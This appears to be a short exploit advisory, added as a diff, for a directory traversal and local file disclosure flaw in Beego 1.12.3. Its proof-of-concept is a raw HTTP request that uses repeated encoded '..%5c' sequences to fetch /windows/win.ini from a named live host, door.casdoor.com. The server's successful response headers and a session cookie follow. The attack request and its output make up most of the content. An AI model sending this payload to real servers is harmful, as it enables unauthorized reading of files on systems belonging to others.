@@ -1,0 +1,35 @@
+=============================================================================================================================================
+| # Title     : Beego 1.12.3 Directory Traversal / Local File Disclosure                                                                    |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://github.com/beego/beego                                                                                              |
+=============================================================================================================================================
+
+[+] References :  
+
+[+] Summary : The vulnerability confirmed here is a Directory Traversal / Local File Disclosure affecting an application running on Beego 1.12.3.
+
+[+]  POC :	
+
+GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini HTTP/1.1
+Host: door.casdoor.com
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+Response
+HTTP/1.1 200 OK
+Accept-Ranges: bytes
+Content-Length: 92
+Content-Type: text/plain; charset=utf-8
+Date: Sat, 06 Dec 2025 14:35:45 GMT
+Last-Modified: Sat, 08 May 2021 08:18:31 GMT
+Server: beegoServer:1.12.3
+Set-Cookie: casdoor_session_id=891e4bf2d09b3240b7d1dd82ceba5c0f; Path=/; Expires=Mon, 05 Jan 2026 14:35:45 GMT; Max-Age=2592000; HttpOnly
+Original-Content-Encoding: gzip
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
